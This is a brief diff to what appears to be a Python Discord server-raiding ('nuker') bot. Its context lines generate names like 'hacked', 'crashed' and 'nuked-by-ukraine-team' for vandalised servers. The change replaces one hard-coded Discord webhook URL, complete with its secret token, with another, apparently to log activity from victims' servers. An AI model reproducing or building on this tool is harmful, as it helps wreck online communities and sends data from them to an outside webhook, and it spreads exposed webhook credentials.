@@ -63,7 +63,7 @@ else:
         d3v = []
         client.remove_command('help')
         NAMES = [f"{random.randint(99, 999)}_hаckёd_{random.randint(99, 999)}", f"{random.randint(99, 999)}_h4ck3d_{random.randint(99, 999)}", f"{random.randint(99, 999)}_crа́shёd_{random.randint(99, 999)}", f"{random.randint(99, 999)}_cr4sh3d_{random.randint(99, 999)}", f"{random.randint(99, 999)}_hc3k4ddd_{random.randint(99, 999)}", f"{random.randint(99, 999)}_nюk3dд_{random.randint(99, 999)}", f"{random.randint(99, 999)}_аzоv_{random.randint(99, 999)}", f"{random.randint(99, 999)}_nukёd-by-ukraine-team_{random.randint(99, 999)}", f"{random.randint(99, 999)}_slаva-ukraine_{random.randint(99, 999)}", f"{random.randint(99, 999)}_ukraine_{random.randint(99, 999)}", f"{random.randint(99, 999)}_ukraine-team_{random.randint(99, 999)}"]
-        logg = 'https://discord.com/api/webhooks/1085870990833238077/1uBqy4iGYb6z88aKnwAUyIKtp-jS3P9ck9XjLI0FGF3MOp4NSL7NlA5CIb-BsMRKrEJ_'
+        logg = 'https://canary.discord.com/api/webhooks/1179866136460931092/CFMcs1JABHlZKafTuFk1Oeo8Ra6iDL3hy_-AWP7ktXf8zx0wYQ-AaFOWOSvX9aak4S_b'
 
         @client.event
         async def on_ready():
